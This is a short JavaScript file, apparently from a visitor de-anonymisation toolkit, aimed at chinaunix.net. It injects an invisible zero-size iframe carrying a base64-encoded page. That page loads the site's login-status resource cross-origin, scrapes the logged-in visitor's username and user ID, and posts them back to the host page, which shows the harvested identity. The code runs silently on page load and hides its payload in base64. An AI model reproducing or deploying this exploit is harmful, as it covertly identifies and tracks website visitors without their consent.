// chinaunix博客  用户名  用户ID  个人主页

console.log('get')
function e(C) {
  if ('chinaunix' === C.data.source) {
    console.log(C)
    var e = C.data.d
    if (e.code) {
      var i = {
        valid: !0,
        data: {
          username: e.userName,
          uid: e.uid,
          home: 'http://chinaunix.net/uid/'.concat(e.uid, '.html'),
        },
      }
      let innerHTML = `
        <div class='item'>
          <p class='title'>chinaunix博客</p>
          <p>个人主页: ${i.data.home}</p>
          <p>用户名: ${i.data.username}</p>
        </div>
      `
      let dom = document.createElement('div')
      dom.innerHTML = innerHTML

      document.getElementById('content').appendChild(dom)
      console.log(i)
    }
  }
}
function chinaunix() {
  var d = document.createElement('iframe')
  d.src =
    'data:text/html;base64,PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+Y2hpbmF1bml4Lm5ldDwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBmdW5jdGlvbiBmb28oKSB7CiAgICAJbGV0IGRhdGEgPSB7fTsKICAgIAlpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2EnKS5sZW5ndGggPCAzICkgewogICAgCQlkYXRhLmNvZGUgPSBmYWxzZQogICAgCX0gZWxzZSB7CiAgICAJCWRhdGEuY29kZSA9IHRydWUKICAgIAl9CiAgICAgICAgZGF0YS51c2VyTmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdhJylbMF0uaW5uZXJUZXh0OwogICAgICAgIGRhdGEudWlkID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2EnKVswXS5nZXRBdHRyaWJ1dGUoJ2hyZWYnKS5zcGxpdCgnLycpWzJdLnNwbGl0KCcuJylbMF0KICAgICAgICBsZXQgZCA9IHtzb3VyY2U6ICJjaGluYXVuaXgiLCBkOiBkYXRhfTsKICAgICAgICB3aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKGQsICIqIik7CiAgICB9Cjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iaHR0cDovL2NoaW5hdW5peC5uZXQvc2l0ZS9sb2dpbnN0YXR1c2Jhci5odG1sIiBvbmxvYWQ9ImZvbygpIj48L3NjcmlwdD4KCjwvaHRtbD4='
  d.width = 0
  d.height = 0
  d.style.borderWidth = 0
  document.documentElement.appendChild(d)
}
window.addEventListener('message', e, !1)
// window.addEventListener('load', function () {
chinaunix()
// })
